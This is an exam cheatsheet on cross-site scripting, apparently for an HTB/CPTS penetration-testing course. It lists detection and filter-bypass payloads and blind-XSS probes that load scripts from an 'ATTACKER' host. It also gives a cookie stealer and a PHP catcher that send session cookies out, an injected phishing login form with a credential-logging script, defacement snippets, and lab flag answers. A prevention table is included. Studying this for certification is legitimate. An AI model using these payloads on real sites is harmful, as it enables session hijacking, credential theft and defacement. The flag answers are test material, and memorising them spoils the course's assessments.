# Cross-Site Scripting (XSS) — Exam Cheatsheet

---

## XSS Types

| Type | Where input lives | Detection |
|------|-------------------|-----------|
| **Stored** | Saved to DB, served to other users | Payload fires every reload, for every user |
| **Reflected** | Echoed back in immediate response | Payload only fires when victim visits crafted URL |
| **DOM-based** | Processed client-side only (`#` fragment, `location.hash`) | Payload never reaches server |

---

## Detection Payloads

```html
<script>alert(window.origin)</script>      <!-- shows current origin -->
<script>alert(document.cookie)</script>    <!-- shows cookies -->
<script>print()</script>                    <!-- print dialog — bypass alert blocks -->
<plaintext>                                  <!-- stops HTML render — visual confirm -->
```

When `<script>` is filtered (innerHTML, wp_kses):
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

---

## Breakout Patterns

| Injection context | Prefix |
|-------------------|--------|
| Raw HTML body | (none) |
| `<input value="X">` | `">` |
| `<input value='X'>` | `'>` |
| `<a href="X">` | `">` (need `http://` prefix to pass URL validation) |
| `<a href='X'>` | `'>` |
| `<img src='X'>` | `'>` |
| Inside `<script>...X...</script>` | `';` |
| Inside JS string `var x = "X"` | `";` |
| URL fragment `#X` (DOM) | (none — depends on sink) |

---

## DOM XSS Sources & Sinks

**Sources:** `document.URL`, `location.hash`, `location.search`, `document.referrer`, `localStorage`, input fields

**Dangerous sinks:**
- Native: `innerHTML`, `outerHTML`, `document.write()`, `eval()`
- jQuery: `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `before()`, `replaceWith()`

**Safe sinks:** `textContent`, `innerText`, jQuery `text()`

---

## Discovery Tools

```bash
# XSStrike — best free option
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
python xsstrike.py -u "http://TARGET/page.php?param=test"
```

Payload lists on Kali:
- `~/SecLists/Fuzzing/XSS/robot-friendly/`  ← ffuf/burp
- `~/SecLists/Fuzzing/XSS/Polyglots/`        ← multi-context strings

---

## Blind XSS — Per-Field Probing

When you can't see where input lands (admin panel, support ticket), use unique callback paths:

```html
<!-- in field "fullname" -->
<script src=http://ATTACKER/fullname></script>
<!-- in field "email" -->
<script src=http://ATTACKER/email></script>
```

Whichever path fires identifies the vulnerable field. Try with breakouts:
```html
"><script src=http://ATTACKER/field_dq></script>
'><script src=http://ATTACKER/field_sq></script>
http://x"><script src=http://ATTACKER/url></script>   <!-- href context -->
```

---

## Cookie Stealer

`script.js`:
```javascript
new Image().src='http://ATTACKER:8080/index.php?c='+document.cookie
```

`index.php` (catcher):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "IP: {$_SERVER['REMOTE_ADDR']} | {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start listener (port 80 needs sudo, use 8080+ otherwise):
```bash
mkdir /tmp/listener && cd /tmp/listener
# write index.php + script.js
php -S 0.0.0.0:8080 &
```

Use stolen cookie:
```bash
curl -sk "http://TARGET/admin/" -H "Cookie: name=value"
```

---

## Phishing — Inject Login Form

```html
'><script>
document.write('<h3>Please login</h3><form action=http://ATTACKER:8080>'
+'<input name="username"><input name="password" type="password">'
+'<input type="submit" value="Login"></form>');
document.getElementById('urlform').remove();
</script><!--
```

`index.php` (credential catcher with redirect):
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $f = fopen("creds.txt", "a+");
    fputs($f, "User: {$_GET['username']} | Pass: {$_GET['password']}\n");
    header("Location: http://TARGET/original_page");
    fclose($f);
    exit();
}
?>
```

---

## Defacing

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://attacker/img.png"</script>
<script>document.title = "Hacked"</script>
<script>document.getElementsByTagName('body')[0].innerHTML = "..."</script>
```

---

## Prevention (CPTS exam fodder)

| Layer | Stops | Tool |
|-------|-------|------|
| Output encoding | Rendered XSS | `htmlspecialchars()` / `htmlentities()` / html-entities (Node) |
| CSP header | Injected `<script>` | `Content-Security-Policy: script-src 'self'` |
| HttpOnly cookies | Cookie theft via XSS | `Set-Cookie: ...; HttpOnly` |
| Input sanitization | Stored attacks | DOMPurify (front+back) |
| Input validation | Malformed input | regex / `filter_var()` |
| WAF | Common patterns | ModSecurity, Cloudflare — bypassable |

**Safe JS sinks:** `textContent`, `innerText`, jQuery `text()`

---

## Lab Flag Reference

| Section | Type | Field | Payload | Flag |
|---------|------|-------|---------|------|
| 2 Stored | task | `<script>alert(document.cookie)</script>` | `HTB{570r3d_f0r_3v3ry0n3_70_533}` |
| 3 Reflected | task (GET) | same | `HTB{r3fl3c73d_b4ck_2_m3}` |
| 4 DOM | `#task=` fragment | `<img src='' onerror=alert(document.cookie)>` | `HTB{pur3ly_cl13n7_51d3}` |
| 5 Discovery | email (error path) | — | — (Q1=email, Q2=reflected) |
| 7 Phishing | url (img src breakout) | `'>` + injected login form | `HTB{r3f13c73d_cr3d5_84ck_2_m3}` |
| 8 Hijacking | imgurl (blind) | `"><script src=ATTACKER/script.js></script>` | `HTB{4lw4y5_53cur3_y0ur_c00k135}` |
| 10 Assessment | url field (WordPress) | `http://x"><script src=ATTACKER/script.js></script>` | `HTB{cr055_5173_5cr1p71n6_n1nj4}` |

---

## Decision Tree When Stuck

```
No reflection on success page?
  → Try the error/failure path (Section 5 lesson)
  → Check headers (User-Agent, Referer)

<script> filtered?
  → Use <img onerror>, <svg onload>, <body onload>

Blind XSS (no visibility into render context)?
  → Per-field unique callback path
  → Try multiple breakouts: '> ">  no-quote

Breakout not working in href context?
  → Add http:// prefix to pass URL validation
  → Then break out with "

Admin bot not biting?
  → Wait 2-5 minutes (cron-based)
  → Verify your listener is reachable from victim subnet (curl from attacker:port works ≠ target can reach you)
```
